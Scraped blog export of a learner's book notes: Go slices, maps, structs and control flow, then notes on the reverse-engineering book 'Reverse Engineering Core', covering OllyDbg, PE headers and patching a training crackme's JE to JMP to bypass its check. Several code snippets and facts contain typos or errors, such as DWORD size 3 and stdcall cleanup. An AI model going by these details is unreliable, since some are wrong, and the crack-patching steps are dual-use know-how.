x[:2]z := x[1:]x[1] = 20y[0] = 10z[1] = 30fmt.Println(&quot;x:&quot;, x)fmt.Println(&quot;y:&quot;, y)fmt.Println(&quot;z:&quot;, z) Output:123x: [10 20 30 4]y: [10 20]z: [20 30 4] Slicing slices gets extra confusing when combined with append:1234567x := []int&#123;1, 2, 3, 4&#125;y := x[:2]fmt.Println(cap(x), cap(y))y = append(y, 30)fmt.Println(&quot;x: &quot;, x)fmt.Println(&quot;y: &quot;, y)Output:1234 4x: [1 2 30 4]y: [1 2 30] Whenever you take a slice from another slice, the subslice’s capacity is set to the capacity of the original slice, minus the offset of the subslice within the original slice. This means that any unused capacity in the original slice is also shared with any subslices. When we make the y slice from x, the length is set to 2, but the capacity is set to 4, the same as x. Since the capacity is 4, appending onto the end of y puts the value in the third position of x. This behavior creates some very odd scenarios, with multiple slices appending and overwriting each other’s data: 123456789101112//A more confusing examplex := make([]int, 0, 5)x = append(x, 1, 2, 3, 4)y := x[:2]z := x[2:]fmt.Println(cap(x), cap(y), cap(z))y = append(y, 30, 40, 50)x = append(x, 60)z = append(z, 70)fmt.Println(&quot;x:&quot;, x)fmt.Println(&quot;y:&quot;, y)fmt.Println(&quot;z:&quot;, z) Output:12345 5 3x: [1 2 30 40 70]y: [1 2 30 40 70]z: [30 40 70] To avoid complicated slice situations, you should either never use append with a subslice or make sure that append doesn’t cause an overwrite by using a full slice expression:12y := x[:2:2]z := x[2:4:4] Converting Arrays to Slices123456x := [4]int&#123;5, 6, 7, 8&#125;y := x[:2]z := x[2:]x[0] = 10fmt.Println(&quot;x:&quot;, x)fmt.Println(&quot;y:&quot;, y) Output:123x: [10 6 7 8]y: [10 6]z: [7 8] copy1234x := []int&#123;1, 2, 3, 4&#125;y := make([]int, 4)num := copy(y, x)fmt.Println(y, num) Output:1[1 2 3 4] 4 123x := []int&#123;1, 2, 3, 4&#125;y := make([]int, 2)copy(y, x[2:]) 123x := []int&#123;1, 2, 3, 4&#125;num = copy(x[:3], x[1:])fmt.Println(x, num) 123456x := []int&#123;1, 2, 3, 4&#125;d := [4]int&#123;5, 6, 7, 8&#125;y := make([]int, 2)copy(y, d[:])fmt.Println(y)copy(d[:], x) Output:12[5 6][1 2 3 4] Strings and Runes and Bytes12var s string = &quot;Hello there&quot;var b byte = s[6] 1234var s string = &quot;Hello there&quot;var s2 string = s[4:7]var s3 string = s[:5]var s4 string = s[6:] Maps map[keyType]valueType1var nilMap map[string]int1totalWins := map[string]int&#123;&#125;12345teams := map[string][]string &#123; &quot;Orcas&quot;: []string&#123;&quot;Fred&quot;, &quot;Ralph&quot;, &quot;Bijou&quot;&#125;, &quot;Lions&quot;: []string&#123;&quot;Sarah&quot;, &quot;Peter&quot;, &quot;Billie&quot;&#125;, &quot;Kittens&quot;: []string&#123;&quot;Waldo&quot;, &quot;Raul&quot;, &quot;Ze&quot;&#125;,&#125;1ages := make(map[int][]string, 10) Maps automatically grow as you add key-value pairs to them. If you know how many key-value pairs you plan to insert into a map, you can use make to create a map with a specific initial size. Passing a map to the len function tells you the number of key-value pairs in a map. The zero value for a map is nil Maps are not comparable. You can check if they are equal to nil, but you cannot check if two maps have identical keys and values using == or differ using != The key for a map can be any comparable type. This means you cannot use a slice or a map as the key for a map. Learn more about hash map: GopherCon 2016, Inside theMap Implementation. Reading and Writing a Map123456789totalWins := map[string]int&#123;&#125;totalWins[&quot;Orcas&quot;] = 1totalWins[&quot;Lions&quot;] = 2fmt.Println(totalWins[&quot;Orcas&quot;])fmt.Println(totalWins[&quot;Kittens&quot;]) //Output: 0totalWins[&quot;Kittens&quot;]++fmt.Println(totalWins[&quot;Kittens&quot;]) //Output: 1totalWins[&quot;Lions&quot;] = 3fmt.Println(totalWins[&quot;Lions&quot;]) The comma ok Idiom123456789101112m := map[string]int&#123; &quot;hello&quot;: 5, &quot;world&quot;: 0,&#125;v, ok := m[&quot;hello&quot;]fmt.Println(v, ok)v, ok := m[&quot;world&quot;]fmt.Println(v, ok)v, ok := m[&quot;goodbye&quot;]fmt.Println(v, ok) Rather than assign the result of a map read to a single variable, with the comma ok idiom you assign the results of a map read to two variables. The first gets the value associated with the key. The second value returned is a bool. It is usually named ok. If ok is true, the key is present in the map. If ok is false, the key is not present. Deleting from Maps12345m := map[string]int&#123; &quot;hello&quot;: 5, &quot;world&quot;: 10,&#125;delete(m, &quot;hello&quot;) Using Maps as Sets1234567891011intSet := map[int]bool&#123;&#125;vals := []int&#123;5, 10, 2, 5, 8, 7, 3, 9, 1, 2, 10&#125;for _, v := range vals &#123; intSet[v] = true&#125;fmt.Println(len(vals), len(intSet))fmt.Println(intSet[5])fmt.Println(intSet(500))if intSet[100] &#123; fmt.Println(&quot;100 is in the set&quot;)&#125; StructsGo doesn’t have classes, because it doesn’t have inheritance. This doesn’t mean Go doesn’t have some of the features of object-oriented languages, it just does things a little differently. 12345type person struct &#123; name string age int pet string&#125; 1var fred person 1bob := personP&#123;&#125; 12345julia := person&#123; &quot;Julia&quot;, 40, &quot;cat&quot;,&#125; 1234beth := person&#123; age: 30, name; &quot;Beth&quot;,&#125; 12beth.name = &quot;Bob&quot;fmt.Println(beth.name) Anonymous Structs1234567891011121314151617var person struct &#123; name string age int pet string&#125;person.name = &quot;bob&quot;person.age = 50person.pet = &quot;dog&quot;pet := struct &#123; name string kind string&#125;&#123; name: &quot;Fido&quot;, kind: &quot;dog&quot;,&#125; Comparing and Converting StructsWhether or not a struct is comparable depends on the struct’s field. Structs that are entirely composed of comparable types are comparable; those with slice or mmap fields are not. 1234type firstPerson struct &#123; name string age int&#125; We can use a type conversion to convert an instance of firstPerson to secondPerson, but we cannot use == to compare an instance of firstPerson and an instance of secondPerson, because they are different types:1234type secondPerson struct &#123; name string age int&#125;We can’t convert an instance of firstPerson to thirdPerson, because the fields are in different order:1234type thirdPerson struct &#123; age int name string&#125;We can’t convert an instance of firstPerson to fourthPerson, because the fields names don’t match:1234type fourthPerson struct &#123; firstName string age int&#125;we can’t convert an instance of firstPerson to fifthPerson because there’san additional field:12345type fifthPerson struct &#123; name string age int favoriteColor string&#125;Anonymous structs add a small twist to this: if two struct variables are being comparedand at least one of them has a type that’s an anonymous struct, you can comparethem without a type conversion if the fields of both structs have the same names,order, and types123456789101112131415type firstPerson struct &#123; name string age int&#125;f := firstPerson&#123; name: &quot;Bob&quot;, age: 50,&#125;var g struct &#123; name string age int&#125;// compiles -- can use = and == between identical named and anonymous structsg = ffmt.Println(f == g) Chapter.4 - Blocks, Shadows, and Control StructuresBlocksEach place where a declaration occurs is called a block. Variables, constants, types, and functions declared outside of any functions are placed in the package block. Shadowing Variables12345678910func main() &#123; x := 10 if x &gt; 5 &#123; fmt.Println(x) x := 5 fmt.Println(x) &#125; fmt.Println(x)&#125; Output:12310510A shadowing variable is a variable that has the same name as a variable in a containing block. For as long as the shadowing variable exists, you cannot access a shadowed variable. 123456789func main() &#123; x := 10 if x &gt; 5 &#123; x, y := 5, 20 fmt.Println(x, y) &#125; fmt.Println(x)&#125; Output:125 2010 if123456789101112131415package mainimport &quot;fmt&quot;import &quot;math/rand&quot;func main() &#123; n := rand.Intn(10) if n == 0 &#123; fmt.Println(&quot;That&#x27;s too low&quot;) &#125; else if n &gt; 5 &#123; fmt.Println(&quot;That&#x27;s too big:&quot;, n) &#125; else &#123; fmt.Println(&quot;That&#x27;s a good number:&quot;, n) &#125;&#125; If you run this code, you’wll find that it always assigns 1 to n. This happends because the default random number seed in math/rand is hard-coded. Go doesn’t need parenthesis around the condition. But there’s another feature that Go adds to if statements that helps you better manager your variables. 12345678//Example 4.6: Scoping a variable to an if statementif n := rand.Intn(10); n == 0 &#123; fmt.Println(&quot;That&#x27;s too low&quot;)&#125; else if n &gt; 5 &#123; fmt.Println(&quot;That&#x27;s too big:&quot;, n)&#125; else &#123; fmt.Println(&quot;That&#x27;s a good number:&quot;, n)&#125; It lets you create variables that are available only where they are needed. Once the series of if/else statements ends, n is undefined. for, Four Ways1234//Example 4-8. A complete for statementfor i := 0; i &lt; 10; i++ &#123; fmt.Println(i)&#125; 123456//Example 4-9. A condition-only for statementi := 1for i &lt; 100 &#123; fmt.Println(i) i = i * 2&#125; 123456//Example 4-10. Infinite loopfunc main() &#123; for &#123; fmt.Println(&quot;Hello&quot;) &#125;&#125; break and continueThere is no Go equivalent of the do keyword in Java, C and JavaScript. If you want to iterate at least once, the cleanest way is to use an infinite for loop that ends with an if statement:123456for &#123; //do something. if !CONDITION &#123; break &#125;&#125;1234567891011121314//Example 4-11. Confusing codefor i := 1; i &lt;= 100; i++ &#123; if i%3 == 0 &#123; if i%5 == 0 &#123; fmt.Println(&quot;FizzBuzz&quot;) &#125; else &#123; fmt.Println(&quot;Fizz&quot;) &#125; &#125; else if i%5 == 0 &#123; fmt.Println(&quot;Buzz&quot;) &#125; else &#123; fmt.Println(i) &#125;&#125;Go encourages short if statement bodies, as left-align as possible. Nested code is difficult to follow. Using a continue statement makes it easier to understand what’s going on.12345678910111213141516//Example 4-12. Using continue to make code clearerfor i := 1; i &lt;= 100; i++ &#123; if i%3 == 0 &amp;&amp; i%5 == 0 &#123; fmt.Println(&quot;FizzBuzz&quot;) continue &#125; if i%3 == 0 &#123; fmt.Println(&quot;Fizz&quot;) continue &#125; if i%5 == 0 &#123; fmt.Println(&quot;Buzz&quot;) continue &#125; fmt.Println(i)&#125; The for-range Statement12345//Example 4-13. The for-range loopevenVals := []int&#123;2, 4, 6, 8, 10, 12&#125;for i, v := range evenVals &#123; fmt.Println(i, v)&#125; Output:1234560 21 42 63 84 105 12The first variable is the position in the data structure being iterated, while the second is the value at that position.12345//Example 4-14. Ignoring the key in a for-range loopevenVals := []int&#123;2, 4, 6, 8, 10, 12&#125;for _, v := range evenVals &#123; fmt.Println(v)&#125;Output:12345624681012 Iterating over maps123456789101112m := map[string]int&#123; &quot;a&quot;: 1, &quot;c&quot;: 3, &quot;b&quot;: 2,&#125;for i := 0; i &lt; 3; i++ &#123; fmt.Println(&quot;Loop&quot;, i) for k, v := range m &#123; fmt.Println(k, v) &#125;&#125; Output:123456789101112Loop 0c 3b 2a 1Loop 1a 1c 3b 2Loop 2a 1c 3b 2The order of the keys and values varies; some runs may be identical. This is actually a security feature. In earlier Go versions, the iteration order for keys in a map was usually (but not always) the same if you inserted the same items into a map. This caused two problems: People would write code that assumed that the order was fixed, and this would break at weired times. If maps always hash items to the exact same values, and you know that a server is storing some user data in a map, you can actually slow down a server with an attack called Hash DoS by sending it specially crafted data where all of the keys hash to the same bucket. Iterating over strings12345678samples := []string&#123;&quot;hello&quot;, &quot;apple_π!&quot;&#125;for _, sample := range samples &#123; for i, r := range sample &#123; fmt.Println(i, r, string(r)) &#125; fmt.Println()&#125; Output:12345678910111213140 104 h1 101 e2 108 l3 108 l4 111 o0 97 a1 112 p2 112 p3 108 l4 101 e5 95 _6 960 π8 33 !In the first column, we have the index; in the second, the numeric value of the letter; and in the third, we have the numeric value of the letter type converted to a string. For apple_π, notice that the first column skips the number 7. Second, the value at position 6 is 960. That’s far larger than what can fit in a byte (2^8 = 256) switch123456789101112131415//Example 4-19:words := []string&#123;&quot;a&quot;, &quot;cow&quot;, &quot;smile&quot;, &quot;gopher&quot;, &quot;octopus&quot;, &quot;anthropologist&quot;&#125;for _, word := range words &#123; switch size := len(word); size &#123; case 1, 2, 3, 4: fmt.Println(word, &quot;is a short word!&quot;) case 5: wordLen := len(word) fmt.Println(word, &quot;is exactly the right length:&quot;, wordLen) case 6, 7, 8, 9: default: fmt.Println(word, &quot;is a long word!&quot;) &#125;&#125; Output:1234a is a short word!cow is a short word!smile is exactly the right length: 5anthropologist is a long word! 1234567891011121314//Example 4-20: The case of missing labelfor i := 0; i &lt; 10; i++ &#123; switch &#123; case i%2 == 0: fmt.Println(i, &quot;is even&quot;) case i%3 == 0: fmt.Println(i, &quot;is divisible by 3 but not 2&quot;) case i%7 == 0: fmt.Println(&quot;Exit the loop&quot;) break default: fmt.Println(i, &quot;is boring&quot;) &#125;&#125; Output:123456789100 is even1 is boring2 is even3 is divisible by 3 but not 24 is even5 is boring6 is evenExit the loop8 is even9 is divisible by 3 but not 2This is not what we intended. To break to loop, we can modify the example 4-20 to 4-21:12345678910111213141516func main() &#123; loop: for i := 0; i &lt; 10; i++ &#123; switch &#123; case i%2 == 0: fmt.Println(i, &quot;is even&quot;) case i%3 == 0: fmt.Println(i, &quot;is divisible by 3 but not 2&quot;) case i%7 == 0: fmt.Println(&quot;Exit the loop&quot;) break loop default: fmt.Println(i, &quot;is boring&quot;) &#125; &#125;&#125;Output:123456780 is even1 is boring2 is even3 is divisible by 3 but not 24 is even5 is boring6 is evenExit the loopOf course, we can change the label loop to anything like Peter. Blank SwichesChapter.5 - FunctionsDeclaring and Calling Functions123456789101112func div(numerator int, denominator int) int &#123; if denominator == 0 &#123; return 0 &#125; return numerator / denominator&#125;func main() &#123; result := div(5, 2) fmt.Println(result)&#125; When you have multiple input parameters of the same type, you can write your input parameters like this:123func div(numerator, denominator int) int &#123;&#125; Go doesn’t have named and optiona input parameters. You must apply all of the parameters for a function. If you want to emulate named and optional parameters, define a struct that has fields that match the desired parameters, and pass the struct to your function.123456789101112131415161718192021//Example 5-1.type MyFuncOpts struct &#123; FirstName string LastName string Age int&#125;func MyFunc(opts MyFuncOpts) error &#123; //do something here&#125;func main() &#123; MyFunc(MyFuncOpts &#123; LastName: &quot;Patel&quot;, Age: 50, &#125;) MyFunc(MyFuncOpts &#123; FirstName: &quot;Joe&quot;, LastName: &quot;Smith&quot;, &#125;)&#125;In practice, not having named and optional parameters isn’t a limitation. A function shouldn’t have more than a few parameters, and named and optional parameters are mostly useful when a function has many inputs. Chapter.6 - PointersChapter.7 - Types, Methods, and InterfacesChapter.8 - Errors","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"Programming","slug":"Programming","permalink":"https://iss4cf0ng.github.io/tags/Programming/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Study","slug":"Study","permalink":"https://iss4cf0ng.github.io/tags/Study/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Coding","slug":"Coding","permalink":"https://iss4cf0ng.github.io/tags/Coding/"},{"name":"Program","slug":"Program","permalink":"https://iss4cf0ng.github.io/tags/Program/"},{"name":"Go-Lang","slug":"Go-Lang","permalink":"https://iss4cf0ng.github.io/tags/Go-Lang/"},{"name":"Go","slug":"Go","permalink":"https://iss4cf0ng.github.io/tags/Go/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Book] Programming Rust","slug":"2026-1-5-ProgrammingRust","date":"2026-01-04T16:09:54.000Z","updated":"2026-01-15T10:33:11.861Z","comments":true,"path":"2026/01/05/2026-1-5-ProgrammingRust/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/05/2026-1-5-ProgrammingRust/","excerpt":"","text":"El libro IntroductionReflection","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Code","slug":"Code","permalink":"https://iss4cf0ng.github.io/tags/Code/"},{"name":"Programming","slug":"Programming","permalink":"https://iss4cf0ng.github.io/tags/Programming/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Study","slug":"Study","permalink":"https://iss4cf0ng.github.io/tags/Study/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Coding","slug":"Coding","permalink":"https://iss4cf0ng.github.io/tags/Coding/"},{"name":"Program","slug":"Program","permalink":"https://iss4cf0ng.github.io/tags/Program/"},{"name":"Rust","slug":"Rust","permalink":"https://iss4cf0ng.github.io/tags/Rust/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Book] Reverse Engineering Core (리버스 엔지니어링 핵심 원리)","slug":"2026-1-4-BookReverseEngineeringCore","date":"2026-01-04T13:41:45.000Z","updated":"2026-01-21T15:42:09.459Z","comments":true,"path":"2026/01/04/2026-1-4-BookReverseEngineeringCore/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/04/2026-1-4-BookReverseEngineeringCore/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “Reverse Engineering Core”.The content will be continuously updated as I read through the book. ReflectionFinally, I have completed this book. I had always wanted to read this book. Unfortunately, due to personal issues, I was unable to do so for a long time. Therefore, I am glad that I finally finished it. This book was originally written in Korean. It also has a Simplified Chinese translation. Unfortunately, I have not found an English version. Perhaps this is because there are already many books on reverse engineering written in English. This book describes the underlying principles of reverse engineering in both theoretical and practical ways. It introduces how to perform software reverse engineering on the Windows platform using tools such as OllyDbg, WinDbg, and PEView. IDA is rarely discussed. Therefore, this book is especially suitable for readers who want to master OllyDbg. This book DOES NOT cover kernel debugging. The book also provides both source code and compiled PE files for all chapters. This is a significant advantage for hands-on practice, because compiling the code yourself may produce different results depending on the environment. In addition, some of the provided code examples are difficult to find on the internet. This book includes: Reverse engineering on Windows OllyDbg WinDbg PE file format Windows API Techniques for improving reverse engineering skills The author’s experience (the author previously worked for an enterprise developing anti-virus software) Advanced debugging Anti-debugging Advanced anti-debugging Anti-anti-debugging Code injection DLL injection Application patching etc. This book does not include: Kernel debugging IDA Pro Ghidra Reverse engineering on Linux Reverse engineering of Android APKs Reverse engineering of iOS applications Prerequisites (Recommended): Basic knowledge of C/C++ Basic knowledge of the Win32 API Basic understanding of Windows Passion, patience, and the ability to use Google You may feel frustrated during the process of reverse engineering. However, the author also mentioned that he experienced similar frustration. Chapter 1 - Reverse EngineeringMurmur…. Blahblahblah…. This chapter introduces the background and basic knowledge of reverse engineering. Chapter 2 - Hello World!2.2 - DebuggingBasic commands of OllyDbg: Command Hotkey Description Restart Ctrl+F2 Restart debugging. Step Into F7 Execute an OP code. If the OP code is CALL, then go into the called code. Step Over F8 Execute an OP code. If the OP code is CALL, then just execute the code rather then go into the called code. Execute till Return Ctrl+F9 Keep executing code until it reached RETN 1234567891011121314#include &quot;windows.h&quot;#include &quot;tchar.h&quot;int _tmain(int argc, TCHAR *argv[])&#123; MessageBox( NULL, L&quot;Hello World!&quot;, L&quot;www.reversecre.com&quot;, MB_OK ); return 0;&#125; This is the main() function of HelloWorld.exe 2.3 - Getting Familar with Debugger Command Hotkey Description Go to Ctrl+G Execute till Cursor F4 Comment ; User-defined comment Label : User-defined label Set/Reset breakpoint F2 Run F9 Show the current EPI * Show the previous Cursor - Preview CALL/JMP address Enter 2.4 - Find a Specific Code Executing Code Searching with Text: Right click -&gt; Search for -&gt; All referenced text strings Searching with used APIs: Right click -&gt; Search for -&gt; All intermodular calls 2.5 - Patching the Code Modifying the BufferHexdump: Modifying, notice that we have to append a null char(00 00) at the end of a string. Patched code: Save code: Adding a new string in memoryInsert a string int memory Modify the assembly code Patched code: Chapter 3 - Little Endian1234BYTE b = 0x12;WORD w = 0x1234;DWORD dw = 0x12345678;char str[] = &quot;abcde&quot;; TYPE Name SIZE Big-Endian Little-Endian BYTE b 1 [12] [12] WORD w 2 [12][34] [34][12] DWORD dw 3 [12][34][56][78] [78][56][34][12] char[] str 4 [61][62][63][64][65][00] [65][64][63][62][61][00] main() function: Hexdump: Chapter 4 - IA-32 Registers4.2 - IA-32 Registers General Purpose Registers(32-bit), x8 Segment Registers(16-bit), x6 Program Status and Control Register(32-bit), x1 Instruction Pointer(32-bit), x1 General Purpose RegistersThese type of registers are used for temporary storage, also can be used for arthimetic calculation. Usually, they are used for storing addresses and constants. EAX: EBX: ECX: EDX: Segment RegistersSegment is a protection technique in IA-32. The IA-32 architecture divides memory into multiple segments, and allocates start address, range, accessing privilege, etc to them. It also provides paging technique. CS: Code Segment SS: Stack Segment DS: Data Segment ES: Extra (Data) Segment FS: Data Segment GS: Data Segment Program Status and Control Register EFLAGS Instruction Pointer EIP Chapter 5 - Stack After the PUSH instruction is executed, ESP moves upward ,and its value decreases by 4 bytes. After the POP EAX instruction is executed, ESP moves downward, and its value increases by 4 bytes. Thus, we can conclude that: When data is pushed onto the stack, the value of the stack pointer decreases and it moves upward.\\When data is popped from the stack, the value of the stack pointer increases and it moves downward. Initially, the stack pointer points to the top of the stack. Chapter 6 - Analyzing abex’ crackme#1Patching (Cracking) Modify the assembly code:Original1JE SHORT 0040103DModified1JMP 0040103D Chapter 7 - Stack Frame7.1 - Stack FrameA stack frame is a structure used to organize a function’s local variables, parameters, and return address.\\It is accessed using EBP as the base pointer (NOT ESP). Assembly C Language Type conversion DWORD PTR SS:[EBP-4] *(DWORD*)(EBP-4) DWORD (4 bytes) WORD PTR SS:[EBP-4] *(WORD*)(EBP-4) WORD (2 bytes) BYTE PTR SS:[EBP-4] *(BYTE*)(EBP-4) BYTE The symbol SS in DWORD PTR SS:\\[EBP-4\\] stands for Stack Segment.Although x86 architecture supports segmented memory, modern Windows uses a flat memory model. Therefore, assembly instructions still syntactically specify a segment register, such as SS, DS, or ES. On 32-bit x86 Windows, these segment registers all refer to the same flat segment, which makes the explicit segment specification effectively meaningless in this context. Since EBP and ESP are registers that reference the stack, OllyDbg automatically appends the SS segment prefix when displaying stack-based memory operands. Chapter 8 - abex’ crackme#28.2 - VB Engineabex’ crackme is written in VB (Visual Basic). A VB (Visual Basic) application is executed by an engine named MSVBVM60.dll (Microsoft Visual Basic Virtual Machine 6.0). A VB application can be compiled into Native Code (N Code) or Pseudo Code (P Code, or The Thunder Runtime Engine). All components of a VB application—such as dialogs, controls, forms, modules, and functions—are stored in the form of internal data structures. However, Microsoft has never publicly documented these structures, which makes debugging VB applications more difficult. 8.3 - DebuggingStub Code: Indirect Call12300401232 $-FF25 A0104000 JMP DWORD PTR DS:[&lt;&amp;MSVBVM60.#100&gt;] ; MSVBVM60.ThunRTMain00401238 &gt; $ 68 141E4000 PUSH abexcm2-.00401E14 ; =&gt; EP0040123D . E8 F0FFFFFF CALL &lt;JMP.&amp;MSVBVM60.#100&gt; ; call ThunRTMain() The instruction at 0040123D is used to call the ThunRTMain() function. Instead of calling the function directly, it performs an indirect call through the jump instruction at 00401232. This is a well-known indirect call technique commonly used by VC++ and the VB compiler. RT_MainStruct Microsoft has never publicly documented the RT_MainStruct. However, some experts have fully reverse-engineered it and published their findings online. ThunRTMain() Notice that the memory addresses are completely different. This region is inside MSVBVM60.dll 8.4 - Analyzing crackme Assembly code that it used: TEST: Logical Compare, it is same as AND. However, TEST only changes the values in EFLAGS register. JE: Jump if equal (ZF = 1). Chapter 9 - Process Explorer https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer Chapter 10 - Calling Convention cdecl stdcall fastcall cdecl is the default method used in C language.1234567891011#include &quot;stdio.h&quot;int add(int a, int b)&#123; return a + b;&#125;int main(int argc, char* argv[])&#123; return add(1, 2);&#125; cdecl stdcall is commonly used in Win32 API, this is used for clearing the stack by the function caller.12345678910#include &quot;stdio.h&quot;int __stdcall add(int a, int b)&#123; return a + b;&#125;int main(int argc, char* argv[])&#123; return add(1, 2);&#125; stdcall fastcallChapter 11 - Lenas Reversing for Newbies Modify the instruction at 00402FE Chapter 12 - How to Learn Reverse EngineeringBlah blah blah… I will write some of the content with my personal idea in “Reflection” Chapter 13 - PE File Format13.2 - PE File FormatPE stands for Portable Executable. A PE file is an executable under x32 platform, it is also know as PE32. A PE+ (or PE32+) is an executable under x64 platform (NOT PE64). VA &amp; RVA RAW + ImageBase = VA13.3 - PE HeaderDOS Header1234567891011121314151617181920212223typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number WORD e_cblp; // Bytes on last page of file WORD e_cp; // Pages in file WORD e_crlc; // Relocations WORD e_cparhdr; // Size of header in paragraphs WORD e_minalloc; // Minimum extra paragraphs needed WORD e_maxalloc; // Maximum extra paragraphs needed WORD e_ss; // Initial (relative) SS value WORD e_sp; // Initial SP value WORD e_csum; // Checksum WORD e_ip; // Initial IP value WORD e_cs; // Initial (relative) CS value WORD e_lfarlc; // File address of relocation table WORD e_ovno; // Overlay number WORD e_res[4]; // Reserved words WORD e_oemid; // OEM identifier (for e_oeminfo) WORD e_oeminfo; // OEM information; e_oemid specific WORD e_res2[10]; // Reserved words LONG e_lfanew; // File address of new exe header &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;//Source: Microsoft Platform SDK - winnt.h (https://github.com/wine-mirror/wine/blob/master/include/winnt.h) e_magic: DOS signature, 4D5A =&gt; ASCII: MZ e_lfanew: Offset of NT header. Here MZ stands for Mark Zbikowski, the engineer who designed DOS executable. DOS Stub Run the following command on Windows XP:1&gt; debug C:\\WINDOWS\\NOTEPAD.exe Although the sentence in the DOS stub states that “This program cannot be run in DOS mode”, notepad.exe can still be executed in a DOS environment. In practice, the DOS loader executes the DOS stub code, which prints the message above and then exits. The DOS stub is optional in a PE file, but modern development tools usually include it by default. Compilers such as VB, VC++, and Delphi all generate PE files with a DOS stub. NT Header1234567typedef struct _IMAGE_NT_HEADERS &#123; DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER32 OptionalHeader;&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;//Source: Microsoft Platform SDK - winnt.h (https://github.com/wine-mirror/wine/blob/master/include/winnt.h) NT Header: File Header1234567891011typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics;&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;//Source: Microsoft Platform SDK - winnt.h (https://github.com/wine-mirror/wine/blob/master/include/winnt.h) There are four important members; file cannot be executed if they are misconfigured. Machine:\\Every CPU architecture has its own machine ID. NumberOfSections:\\PE file stores code, data and resources in different sections, each with its own attributes. NumberOfSections indicates the total number of sections in the file. This value MUST BE GREATER THAN ZERO.\\In addition, an executable cannot be loaded if the number of sections does not match the actual section table. SizeOfOptionalHeader:\\The last member of structure IMAGE_NT_HEADERS is IMAGE_OPTIONAL_HEADER32. SizeOfOptionalHeader indicates the size of the IMAGE_OPTIONAL_HEADER32 structure.\\Although IMAGE_OPTIONAL_HEADER is defined as a C structure, the Windows PE loader must still rely on the value of SizeOfOptionalHeader to determine its actual size.\\In PE32+ files, IMAGE_OPTIONAL_HEADER64 is used instead of IMAGE_OPTIONAL_HEADER32. Since these two structures have different sizes, SizeOfOptionalHeader must explicitly specify the correct size. Characteristics:\\This field is used to describe the attributes of the file. This value might not contain the 0x0002 (IMAGE_FILE_EXECUTABLE_IMAGE) flags for the files such as *.obj and *.dll. NT Header: Optional Header123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; DWORD BaseOfData; // // NT additional fields. // DWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h The following members are important. An executable cannot not be loaded if they are misconfigured. Magic:\\IMAGE_OPTIONAL_HEADER32 has this value by 10B; IMAGE_OPTIONAL_HEADER64 has this value by 20B. AddressOfEntry:\\This field has the RVA value of EP. RVA value indicates the code which is the first priority of executing. ImageBase:\\The address range of virtual memory is 0~FFFFFFFF on x32 platform. ImageBase indicates first loaded address of the file. SectionAlignment, FileAlignment:\\ SizeOfImage SizeOfHeaders Subsystem NumberOfRvaAndSizes DataDirectory Section Header13.4 - RVA to RAW \\begin{align*} RAW - PointerToRawData &= RVA - VirtualAddress\\\\ RAW &= RVA - VirtualAddress + PointerToRawData \\end{align*}QuizGiven the following figure, answer the following questions: RVA = 5000, File Offset = ?\\Here we assume the ImageBase is 01000000.It is located in the first section (.text) since 01000000 + 5000 = 01005000The range of the first section (.text) is: 01001000 ~ 01009000.\\Thus, RAW = 5000(RVA) - 1000(VirtualAddress) + 400(PointerToRawData)=4400 RVA = 13314, File Offset = ?RVA = 13314 is located in the third section (.rsrc).\\Thus, RAW= 13314(RVA) - B000(VA) + 8400(PointerToRawData) = 10714 RVA = ABA8, File Offset = ?RVA = ABA8 is located in the second section (.data).\\ RAW = ABA8(RVA) - 